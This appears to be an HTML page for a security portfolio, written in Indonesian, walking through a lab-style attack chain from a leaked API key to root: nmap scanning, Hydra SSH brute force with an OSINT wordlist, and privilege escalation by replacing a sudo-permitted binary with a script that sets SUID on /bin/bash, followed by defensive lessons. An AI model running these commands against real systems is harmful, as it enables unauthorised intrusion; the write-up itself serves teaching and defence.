@@ -1,0 +1,156 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>API to Root: Multi-Stage Audit | alif-cybersec</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@300;400;500;700&family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
+    <style>
+        :root { --accent: #10b981; --dark: #020617; }
+        body { background-color: var(--dark); color: #e2e8f0; font-family: 'Inter', sans-serif; }
+        .terminal-font { font-family: 'Fira Code', monospace; }
+        .glow-text { text-shadow: 0 0 10px rgba(16, 185, 129, 0.5); }
+        .accent-emerald { color: var(--accent); }
+        
+        body::before {
+            content: " "; display: block; position: fixed; top: 0; left: 0; bottom: 0; right: 0;
+            background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.2) 50%), linear-gradient(90deg, rgba(255, 0, 0, 0.03), rgba(0, 255, 0, 0.01), rgba(0, 0, 255, 0.03));
+            z-index: 9999; background-size: 100% 4px, 3px 100%; pointer-events: none; opacity: 0.4;
+        }
+
+        .hero-banner { 
+            height: 350px; 
+            background: linear-gradient(to bottom, rgba(2, 6, 23, 0.2), var(--dark)), url('https://images.unsplash.com/photo-1451187580459-43490279c0fa?auto=format&fit=crop&q=80&w=2072'); 
+            background-size: cover; background-position: center;
+        }
+        .step-num { font-size: 4rem; font-weight: 900; color: rgba(16, 185, 129, 0.05); position: absolute; left: -2rem; top: -1rem; line-height: 1; }
+    </style>
+</head>
+<body class="antialiased selection:bg-emerald-500/30">
+    <div class="hero-banner relative flex items-end pb-12">
+        <div class="max-w-4xl mx-auto w-full px-6">
+            <div class="inline-block px-3 py-1 bg-emerald-500/20 border border-emerald-500/40 rounded text-[10px] font-black uppercase tracking-[0.3em] accent-emerald mb-4">Audit // AS-001</div>
+            <h1 class="text-4xl md:text-6xl font-black text-white tracking-tight glow-text">API to Root</h1>
+        </div>
+    </div>
+
+    <div class="max-w-4xl mx-auto px-6 py-16">
+        <!-- Exec Summary -->
+        <section class="mb-24">
+            <div class="p-8 bg-slate-900/50 border border-slate-800 rounded-2xl border-l-4 border-l-emerald-500 shadow-2xl backdrop-blur-sm">
+                <h2 class="text-xl font-bold accent-emerald mb-4 uppercase tracking-widest">Executive Summary</h2>
+                <p class="text-slate-300 italic text-lg leading-relaxed">
+                    "Operasi ini mendemonstrasikan bagaimana satu titik lemah pada dokumentasi teknis (API Leak) dapat dieksploitasi secara berantai menggunakan teknik OSINT dan manipulasi sistem file untuk mendapatkan kendali penuh (Root) pada infrastruktur server internal."
+                </p>
+            </div>
+        </section>
+
+        <!-- Phase 1: Recon -->
+        <section class="mb-24 relative">
+            <div class="step-num">01</div>
+            <h2 class="text-2xl font-bold accent-emerald mb-8 flex items-center">
+                <span class="mr-4 text-white opacity-20">/</span> Reconnaissance & Service Discovery
+            </h2>
+            <p class="text-slate-400 mb-6 leading-relaxed">
+                Pemindaian menyeluruh dilakukan menggunakan Nmap untuk memetakan permukaan serangan (attack surface). Ditemukan tiga layanan aktif yang menarik perhatian:
+            </p>
+            <div class="bg-black/60 rounded-xl p-6 border border-slate-800 mb-8">
+                <div class="terminal-font text-xs space-y-1">
+                    <div class="text-slate-500"># nmap -sC -sV -oN recon.txt target.internal</div>
+                    <div class="text-emerald-400">PORT     STATE SERVICE VERSION</div>
+                    <div class="text-white">22/tcp   open  ssh     OpenSSH 8.4p1</div>
+                    <div class="text-white">80/tcp   open  http    Apache httpd 2.4.41</div>
+                    <div class="text-white">8000/tcp open  http    Gunicorn (Analysis Framework)</div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Phase 2: Info Leak -->
+        <section class="mb-24 relative">
+            <div class="step-num">02</div>
+            <h2 class="text-2xl font-bold accent-emerald mb-8 flex items-center">
+                <span class="mr-4 text-white opacity-20">/</span> Initial Access: The API Key Leak
+            </h2>
+            <p class="text-slate-400 mb-6 leading-relaxed">
+                Layanan pada port 8000 merupakan framework analisis mobile. Akses ke <code>/api_docs</code> membocorkan API Key administratif. Menggunakan kunci ini, kami mengunggah file dummy untuk memicu error sistem.
+            </p>
+            <div class="bg-black/60 rounded-xl p-6 border border-slate-800 mb-8">
+                <div class="terminal-font text-xs text-red-400">
+                    <div class="text-slate-500 mb-2">// Response Error Analysis</div>
+                    [ERROR] Failed to process payload.<br>
+                    Traceback: File "/home/internal_dev/analysis_engine/app.py", line 42...<br>
+                    <span class="text-yellow-400 font-bold">[!] Leak Detected: Found username 'internal_dev'</span>
+                </div>
+            </div>
+        </section>
+
+        <!-- Phase 3: OSINT & Shell -->
+        <section class="mb-24 relative">
+            <div class="step-num">03</div>
+            <h2 class="text-2xl font-bold accent-emerald mb-8 flex items-center">
+                <span class="mr-4 text-white opacity-20">/</span> Weaponized OSINT: Obtaining Shell
+            </h2>
+            <p class="text-slate-400 mb-6 leading-relaxed">
+                Melalui riset profil pengembang pada blog perusahaan, ditemukan ketertarikan pada sejarah tertentu. Data kota kelahiran diolah menjadi wordlist. Serangan brute-force SSH dilakukan menggunakan <code>Hydra</code>.
+            </p>
+            <div class="bg-black/60 rounded-xl p-6 border border-slate-800 mb-8">
+                <div class="terminal-font text-xs">
+                    <div class="text-slate-500"># targeted brute force attack</div>
+                    <div class="text-emerald-400">$ hydra -l internal_dev -P custom_list.txt ssh://target.internal</div>
+                    <div class="mt-2 text-white">[22][ssh] host: target.internal  login: <span class="text-emerald-500">internal_dev</span>  password: <span class="text-emerald-500">BirthCity1573</span></div>
+                    <div class="mt-4 text-yellow-500">$ ssh internal_dev@target.internal</div>
+                    <div class="text-emerald-400">internal_dev@server:~$ <span class="text-white">id</span></div>
+                    <div class="text-white">uid=1001(internal_dev) gid=1001(internal_dev) groups=1001...</div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Phase 4: PrivEsc -->
+        <section class="mb-24 relative">
+            <div class="step-num">04</div>
+            <h2 class="text-2xl font-bold accent-emerald mb-8 flex items-center">
+                <span class="mr-4 text-white opacity-20">/</span> Privilege Escalation: Sudo Hijacking
+            </h2>
+            <p class="text-slate-400 mb-6 leading-relaxed">
+                Pemeriksaan <code>sudo -l</code> mengungkap izin eksekusi tool audit tanpa password. Namun, biner tersebut berada dalam direktori home yang dapat ditulis (writable). Kami memindahkan biner asli dan menggantinya dengan script pemberi akses Root.
+            </p>
+            <div class="bg-slate-900/80 rounded-2xl border border-slate-800 p-8 shadow-2xl">
+                <div class="terminal-font text-sm space-y-2">
+                    <div class="text-slate-500"># Hijacking the authorized path</div>
+                    <div class="text-emerald-400">mv ~/engine/audit_tool ~/engine/audit_tool_bak</div>
+                    <div class="text-emerald-400">echo -e '#!/bin/bash\nchmod +s /bin/bash' > ~/engine/audit_tool</div>
+                    <div class="text-emerald-400">chmod +x ~/engine/audit_tool</div>
+                    <div class="text-yellow-400 mt-4">sudo /home/internal_dev/engine/audit_tool</div>
+                    <div class="text-white font-bold">internal_dev@server:~$ <span class="text-emerald-400">bash -p</span></div>
+                    <div class="text-white font-black text-lg">root# <span class="text-emerald-500">whoami && id</span></div>
+                    <div class="text-emerald-500">root (uid=0)</div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Lessons -->
+        <section class="mb-20 border-t border-slate-800 pt-16">
+            <h2 class="text-xl font-bold accent-emerald mb-10 flex items-center tracking-widest"><span class="mr-4 opacity-50 text-white">05</span> LESSONS LEARNED</h2>
+            <div class="grid grid-cols-1 md:grid-cols-3 gap-6 text-sm">
+                <div class="p-6 bg-slate-900/50 rounded-xl border border-slate-800 hover:border-emerald-500/30 transition">
+                    <div class="text-white font-bold mb-2">API Hardening</div>
+                    <p class="text-slate-500 leading-relaxed">Jangan biarkan dokumentasi API administratif dapat diakses tanpa autentikasi.</p>
+                </div>
+                <div class="p-6 bg-slate-900/50 rounded-xl border border-slate-800 hover:border-emerald-500/30 transition">
+                    <div class="text-white font-bold mb-2">Secure Sudo</div>
+                    <p class="text-slate-500 leading-relaxed">Hindari memberikan izin sudo pada file di direktori yang dapat dimodifikasi oleh user.</p>
+                </div>
+                <div class="p-6 bg-slate-900/50 rounded-xl border border-slate-800 hover:border-emerald-500/30 transition">
+                    <div class="text-white font-bold mb-2">Privacy Aware</div>
+                    <p class="text-slate-500 leading-relaxed">Data personal pengembang dapat digunakan sebagai senjata OSINT untuk memicu serangan auth.</p>
+                </div>
+            </div>
+        </section>
+
+        <footer class="pt-16 border-t border-slate-800 text-center">
+            <a href="../index.html" class="inline-block px-10 py-3 bg-emerald-600 hover:bg-emerald-500 text-white font-bold rounded-lg transition-all shadow-lg">RETURN TO DASHBOARD</a>
+        </footer>
+    </div>
+</body>
+</html>
